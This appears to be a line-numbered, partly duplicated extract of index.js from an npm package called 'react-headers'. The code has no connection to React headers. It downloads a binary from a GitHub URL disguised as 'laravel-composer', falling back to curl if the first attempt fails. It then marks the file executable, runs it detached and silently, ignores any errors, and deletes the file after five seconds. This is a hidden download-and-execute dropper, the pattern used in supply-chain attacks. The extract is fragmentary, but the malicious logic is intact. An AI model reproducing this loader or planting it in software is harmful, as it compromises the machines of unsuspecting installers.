// File: tmp/tmph67idbu7/react-headers/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const http = require('http')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 5: _tmp_10 = require('child_process')
Line 6: const os = require('os')
Line 9: const fileUrl = 'https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer'
Line 14: path.join(tempDir, fileName)
Line 22: {
            const isHttps = currentUrl.startsWith('https:');
            const client = isHttps ? https : http;

            const request = client.get(currentUrl, (response) => {
                // Handle redirects
                if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
                    if (redirectCount >= maxRedirects) {
                        file.destroy();
                        fs.unlink(destination, () => { });
                        reject(new Error('Too many redirects'));
                        return;
                    }
                    redirectCount++;
                    file.destroy();
                    fs.unlink(destination, () => { });
                    const newFile = fs.createWriteStream(destination);
                    makeRequest(response.headers.location);
                    return;
                }

                // Check if request was successful
                if (response.statusCode...
Line 28: {
                    if (redirectCount >= maxRedirects) {
                        file.destroy();
                        fs.unlink(destination, () => { });
                        reject(new Error('Too many redirects'));
                        return;
                    }
                    redirectCount++;
                    file.destroy();
                    fs.unlink(destination, () => { });
                    const newFile = fs.createWriteStream(destination);
                    makeRequest(response.headers.location);
                    return;
                }
Line 29: {
                        file.destroy();
                        fs.unlink(destination, () => { });
                        reject(new Error('Too many redirects'));
                        return;
                    }
Line 30: file.destroy()
Line 36: file.destroy()
Line 44: {
                    file.destroy();
                    fs.unlink(destination, () => { });
                    reject(new Error(`Failed to download file: ${response.statusCode}`));
                    return;
                }
Line 45: file.destroy()
Line 51: response.pipe(file)
Line 56: fs.stat(destination, (err, stats) => {
                        if (err || stats.size === 0) {
                            fs.unlink(destination, () => { });
                            reject(new Error('Downloaded file is empty or invalid'));
                            return;
                        }
                        resolve();
                    })
Line 72: {
                file.destroy();
                fs.unlink(destination, () => { });
                reject(err);
            }
Line 73: file.destroy()
Line 78: request.setTimeout(30000, () => {
                request.destroy();
                file.destroy();
                fs.unlink(destination, () => { });
                reject(new Error('Download timeout'));
            })
Line 79: request.destroy()
Line 80: file.destroy()
Line 92: {
        // Make file executable
        exec(`chmod +x "${filePath}"`, (chmodError) => {
            if (chmodError) {
                reject(chmodError);
                return;
            }

            // Execute the file in background with detached process
            const child = spawn(filePath, [], {
                detached: true,
                stdio: ['ignore', 'ignore', 'ignore'], // Silent execution
                cwd: tempDir
            });

            // Unreference the child process so parent can exit
            child.unref();

            // Handle process events
            child.on('error', (error) => {
                // Silently handle errors in background execution
                resolve(); // Still resolve to not block the main process
            });

            child.on('spawn', () => {
                resolve();
            });
        });
    }
Line 94: exec(`chmod +x "${filePath}"`, (chmodError) => {
            if (chmodError) {
                reject(chmodError);
                return;
            }

            // Execute the file in background with detached process
            const child = spawn(filePath, [], {
                detached: true,
                stdio: ['ignore', 'ignore', 'ignore'], // Silent execution
                cwd: tempDir
            });

            // Unreference the child process so parent can exit
            child.unref();

            // Handle process events
            child.on('error', (error) => {
                // Silently handle errors in background execution
                resolve(); // Still resolve to not block the main process
            });

            child.on('spawn', () => {
                resolve();
            });
        })
Line 101: const child = spawn(filePath, [], {
                detached: true,
                stdio: ['ignore', 'ignore', 'ignore'], // Silent execution
                cwd: tempDir
            })
Line 103: _tmp_6.stdio = ['ignore', 'ignore', 'ignore']
Line 125: {
        const curlCommand = `curl -L -s -o "${destination}" "${url}"`;
        exec(curlCommand, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }

            // Verify file was downloaded and has content
            fs.stat(destination, (err, stats) => {
                if (err || stats.size === 0) {
                    fs.unlink(destination, () => { });
                    reject(new Error('Curl download failed or file is empty'));
                    return;
                }
                resolve();
            });
        });
    }
Line 127: exec(curlCommand, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }

            // Verify file was downloaded and has content
            fs.stat(destination, (err, stats) => {
                if (err || stats.size === 0) {
                    fs.unlink(destination, () => { });
                    reject(new Error('Curl download failed or file is empty'));
                    return;
                }
                resolve();
            });
        })
Line 134: fs.stat(destination, (err, stats) => {
                if (err || stats.size === 0) {
                    fs.unlink(destination, () => { });
                    reject(new Error('Curl download failed or file is empty'));
                    return;
                }
                resolve();
            })
Line 148: {
        // Try Node.js download first
        try {
            await downloadFile(fileUrl, filePath);
        } catch (nodeError) {
            // Fallback to curl if Node.js download fails
            await downloadWithCurl(fileUrl, filePath);
        }

        // Execute the file in background silently
        await executeInBackground(filePath);

        // Clean up after a delay (optional)
        setTimeout(() => {
            fs.unlink(filePath, () => { }); // Silently remove temp file
        }, 5000);

    }
Line 151: downloadFile(fileUrl, filePath)
Line 154: downloadWithCurl(fileUrl, filePath)
Line 161: setTimeout(() => {
            fs.unlink(filePath, () => { }); // Silently remove temp file
        }, 5000)
Line 172: main()
